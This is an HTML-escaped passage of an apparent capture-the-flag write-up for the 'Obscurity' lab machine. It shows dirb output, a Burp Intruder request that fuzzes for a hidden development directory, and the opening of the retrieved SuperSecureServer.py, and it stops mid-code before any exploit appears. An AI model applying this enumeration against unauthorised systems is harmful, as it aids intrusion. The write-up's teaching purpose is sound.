&lt;p&gt;That's why our motto is 'security through obscurity'; we write all our own
software from scratch, even the webserver this is running on! This means that
no exploits can possibly exist for it, which means it's totally secure!&lt;/p&gt;
&lt;p&gt;Development
Server Dev&lt;/p&gt;
&lt;p&gt;Message to server devs: the current source code for the web server is in 'SuperSecureServer.py' in the secret development directory&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We launch a &lt;code&gt;dirb&lt;/code&gt; in order to find this secret development directory. But
nothing come up.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;-----------------&lt;/span&gt;
&lt;span class="code-line"&gt;DIRB v2.22&lt;/span&gt;
&lt;span class="code-line"&gt;By The Dark Raver&lt;/span&gt;
&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;OUTPUT_FILE: dirb&lt;/span&gt;
&lt;span class="code-line"&gt;START_TIME: Fri Dec  6 05:50:36 2019&lt;/span&gt;
&lt;span class="code-line"&gt;URL_BASE: http://10.10.10.168:8080/&lt;/span&gt;
&lt;span class="code-line"&gt;WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;GENERATED WORDS: 4612&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;---- Scanning URL: http://10.10.10.168:8080/ ----&lt;/span&gt;
&lt;span class="code-line"&gt;+ http://10.10.10.168:8080/index.html (CODE:200|SIZE:4171)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
&lt;span class="code-line"&gt;END_TIME: Fri Dec  6 06:06:25 2019&lt;/span&gt;
&lt;span class="code-line"&gt;DOWNLOADED: 4612 - FOUND: 1&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We know that the folder will contain the &lt;code&gt;SuperSecureServer.py&lt;/code&gt; file.
We fire up burp and load the following in our intruder.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;GET /§§/SuperSecureServer.py HTTP/1.1&lt;/span&gt;
&lt;span class="code-line"&gt;Host: 10.10.10.168:8080&lt;/span&gt;
&lt;span class="code-line"&gt;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0&lt;/span&gt;
&lt;span class="code-line"&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&lt;/span&gt;
&lt;span class="code-line"&gt;Accept-Language: en-US,en;q=0.5&lt;/span&gt;
&lt;span class="code-line"&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;
&lt;span class="code-line"&gt;Connection: close&lt;/span&gt;
&lt;span class="code-line"&gt;Upgrade-Insecure-Requests: 1&lt;/span&gt;
&lt;span class="code-line"&gt;If-Modified-Since: Fri, 06 Dec 2019 14:51:43&lt;/span&gt;
&lt;span class="code-line"&gt;Cache-Control: max-age=0&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We attack it in sniper mod using the &lt;code&gt;dirb&lt;/code&gt; wordlist in
&lt;code&gt;/usr/share/dirb/wordlists/common.txt&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;We sort the result by response's size and found the &lt;code&gt;develop&lt;/code&gt; directory.&lt;/p&gt;
&lt;p&gt;&lt;img alt="burp intruder" src="/media/2020.05/obscurity_1.png"&gt;&lt;/p&gt;
&lt;p&gt;We &lt;code&gt;wget&lt;/code&gt; the code on our machine.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;socket&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;threading&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;datetime&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;datetime&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;mimetypes&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;urllib.parse&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;subprocess&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;respTemplate&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;HTTP/1.1 &lt;/span&gt;&lt;span class="si"&gt;{statusNum}&lt;/span&gt;&lt;span class="s2"&gt; &lt;/span&gt;&lt;span class="si"&gt;{statusCode}&lt;/span&gt;&lt;span class="s2"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;Date: &lt;/span&gt;&lt;span class="si"&gt;{dateSent}&lt;/span&gt;&lt;span class="s2"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;Server: &lt;/span&gt;&lt;span class="si"&gt;{server}&lt;/span&gt;&lt;span class="s2"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;Last-Modified: &lt;/span&gt;&lt;span class="si"&gt;{modified}&lt;/span&gt;&lt;span class="s2"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;Content-Length: &lt;/span&gt;&lt;span class="si"&gt;{length}&lt;/span&gt;&lt;span class="s2"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;Content-Type: &lt;/span&gt;&lt;span class="si"&gt;{contentType}&lt;/span&gt;&lt;span class="s2"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;Connection: &lt;/span&gt;&lt;span class="si"&gt;{connectionType}&lt;/span&gt;&lt;span class="s2"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="si"&gt;{body}&lt;/span&gt;&lt;span class="s2"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;DOC_ROOT&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;DocRoot&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;CODES&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;200&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;OK&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="s2"&gt;&amp;quot;304&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;NOT MODIFIED&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="s2"&gt;&amp;quot;400&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;BAD REQUEST&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;401&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;UNAUTHORIZED&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;403&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;FORBIDDEN&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;404&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;NOT FOUND&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="s2"&gt;&amp;quot;500&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;INTERNAL SERVER ERROR&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;MIMES&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;text/plain&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;css&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;text/css&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;html&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;text/html&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;png&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;image/png&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;jpg&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;image/jpg&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="s2"&gt;&amp;quot;ttf&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;application/octet-stream&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;otf&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;application/octet-stream&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;woff&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;font/woff&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;woff2&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;font/woff2&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="s2"&gt;&amp;quot;js&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;application/javascript&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;gz&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;application/zip&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;py&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;text/plain&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;map&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;application/octet-stream&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Response&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="vm"&gt;__dict__&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;update&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;now&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;now&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dateSent&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;modified&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;now&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strftime&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;%a&lt;/span&gt;&lt;span class="s2"&gt;, &lt;/span&gt;&lt;span class="si"&gt;%d&lt;/span&gt;&lt;span class="s2"&gt; %b %Y %H:%M:%S&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;stringResponse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;respTemplate&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="vm"&gt;__dict__&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Request&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;good&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;True&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;request&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;parseRequest&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;method&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;method&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;doc&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;doc&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vers&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;vers&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;header&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;header&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;body&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;body&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;except&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;good&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;False&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;parseRequest&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;req&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strip&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\r&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;method&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;doc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;vers&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot; &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;header&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;body&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;headerDict&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{}&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;param&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;header&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;pos&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;param&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;find&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;: &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;val&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;param&lt;/span&gt;&lt;span class="p"&gt;[:&lt;/span&gt;&lt;span class="n"&gt;pos&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;param&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;pos&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;:]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;headerDict&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;update&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;val&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;method&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;method&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;doc&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;doc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;vers&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;vers&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;header&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;headerDict&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;body&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;body&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Server&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;host&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;host&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;port&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt;&lt;/span&gt;
